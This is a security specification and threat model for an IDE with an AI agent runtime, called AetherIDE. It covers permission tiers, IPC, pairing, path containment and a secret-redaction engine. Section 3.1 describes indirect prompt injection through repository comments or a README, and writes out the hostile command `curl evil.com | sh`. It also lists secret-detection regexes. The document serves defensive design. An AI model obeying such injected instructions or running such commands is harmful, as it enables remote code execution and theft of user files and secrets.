# AetherIDE — Security Specification & Threat Model

## 1. Security Architecture Principles
1. **Defense in Depth:** Every layer (Editor UI, IPC Boundary, Rust Core, OS Execution, Agent Runtime, Cloud Gateway) enforces independent authorization and validation.
2. **Least Privilege:** Tools and agents run with the minimum OS and filesystem permissions required.
3. **Untrusted Input Assumption:** All repository content, source comments, web documents, external LLM outputs, and MCP responses are treated as untrusted data susceptible to prompt injection.
4. **Secret Protection:** Secrets (API keys, private keys, SSH keys, session tokens) are stored in platform credential stores (Windows DPAPI / Credential Manager) and never logged or serialized into LLM prompts.

## 2. Permission Tiers
| Tier | Description | Examples | Approval Requirement |
| :--- | :--- | :--- | :--- |
| **P0: Read-Only** | Non-destructive reads | Reading files, viewing AST, listing symbols, checking git status | Automatic in all modes |
| **P1: Reversible** | Modifying workspace files tracked by Git | Editing source code, formatting, creating files in worktree | Auto in Autopilot; Confirm in Assist |
| **P2: Process Execution** | Running local compilers or test runners | `cargo test`, `npm test`, `pytest`, `tsc` | Auto in Autopilot if whitelisted; Confirm otherwise |
| **P3: Network Egress** | External outbound calls | Fetching dependencies, calling AI APIs, EAS build triggers | Whitelisted domains auto; others require user approval |
| **P4: Destructive** | Irreversible filesystem or system changes | `rm -rf`, `git reset --hard`, modifying files outside workspace | **Always requires explicit user confirmation** |
| **P5: Credential-Sensitive** | Accessing keys, vault, or environment credentials | Reading `.env`, modifying API keys, signing certificates | **Always requires explicit password / biometric confirmation** |

## 3. Threat Modeling & Mitigation Matrix

### 3.1 Prompt Injection & Indirect Agent Hijacking
- **Threat:** A cloned repository contains malicious comments in code or a `README.md` instructing the AI agent to exfiltrate files or execute `curl evil.com | sh`.
- **Mitigation:**
  - Strict system prompt delimiters separating instructions from untrusted repository context.
  - Process execution tool enforces a strict whitelist of binaries (`cargo`, `git`, `npm`, `node`, `pytest`, `python`).
  - Shell commands cannot invoke arbitrary network downloaders without explicit Tier P4 approval.
  - Secret redaction regex scanner blocks transmission of tokens matching high-entropy formats (API keys, JWTs, AWS credentials).

### 3.2 IPC Boundary Security
- **Threat:** A malicious process running on the user's desktop attempts to connect to `\\.\pipe\aether-daemon-ipc` to execute arbitrary commands.
- **Mitigation:**
  - Named Pipe security descriptor restricts access exclusively to the current Windows user SID (`CREATOR_OWNER` with `GENERIC_ALL`).
  - Connection handshake requires a 256-bit ephemeral cryptographic session token generated by the daemon at startup and passed to the IDE UI via a secure temporary file.
  - No open unauthenticated TCP ports.

### 3.3 Remote Companion Pairing Security
- **Threat:** Man-in-the-middle or unauthorized pairing of an iOS companion over the local network or cloud relay.
- **Mitigation:**
  - Out-of-band QR code containing an ephemeral public key and nonce.
  - Mutual TLS (mTLS) or end-to-end encrypted WebSocket connection using ChaCha20-Poly1305.
  - Device revocation list stored in local SQLite database.

### 3.4 Constant-Time Session Authentication & Timing Attack Elimination (Sprint 07)
- **Threat:** Statistical timing analysis of byte-by-byte or length-checked token comparisons allows local attackers to recover session tokens.
- **Mitigation:**
  - `security-core::TokenManager::verify_token` digests both expected and provided tokens using SHA-256 (32 bytes fixed).
  - Bitwise XOR accumulation (`diff |= a ^ b`) compares all 32 bytes without early loop termination or variable branch penalties.

### 3.5 Filesystem Boundary Containment (`resolve_contained_path`) (Sprint 07)
- **Threat:** Directory traversal (`../../`), Windows drive letters (`C:\Windows\...`), UNC paths, symlinks, or reserved Windows device names (`CON`, `PRN`, `AUX`, `NUL`) escape workspace root boundaries.
- **Mitigation:**
  - Component-by-component path validation rejects root directories, drive letters, and parent traversal components.
  - Case-insensitive blacklist rejection for all reserved DOS/Windows device namespaces.
  - Canonicalization target strictly verified to start with workspace root canonical path.

### 3.6 Backend-Enforced Role-Based Access Control (`RoleRegistry`) (Sprint 07)
- **Threat:** Rogue or demoted peers forge elevated roles (e.g. `role: "Owner"`) in collaborative CRDT IPC payloads.
- **Mitigation:**
  - Client-supplied `role` parameter in `CrdtApplyUpdate` is strictly ignored by the backend.
  - `aether-daemon` verifies permissions directly against `RoleRegistry`, defaulting unregistered peers to least-privilege `Viewer`.

### 3.7 Staged Auto-Updater & Rollback Protection (Sprint 07)
- **Threat:** Downgrade attacks or corrupted update payloads breaking desktop installations.
- **Mitigation:**
  - Strict semantic version comparison ensures target version strictly exceeds current installed version.
  - SHA-256 checksum and Ed25519 digital signature validation before staging.
  - Atomic swap with automatic `.rollback_bak` recovery upon installation failure.

## 4. Secret Redaction Engine
AetherIDE includes a native Rust secret scanner (`security-core::redact_secrets`) that intercepts all stdout/stderr logs, diff views, and outgoing LLM payloads, replacing detected secrets with `[REDACTED_SECRET_<HASH>]`:
- OpenAI keys (`sk-[A-Za-z0-9]{48}`)
- Anthropic keys (`sk-ant-[A-Za-z0-9\-_]{80,}`)
- GitHub tokens (`ghp_[A-Za-z0-9]{36}`, `github_pat_[A-Za-z0-9_]{82}`)
- AWS Access Keys (`AKIA[0-9A-Z]{16}`)
- Generic Private Keys (`-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----`)
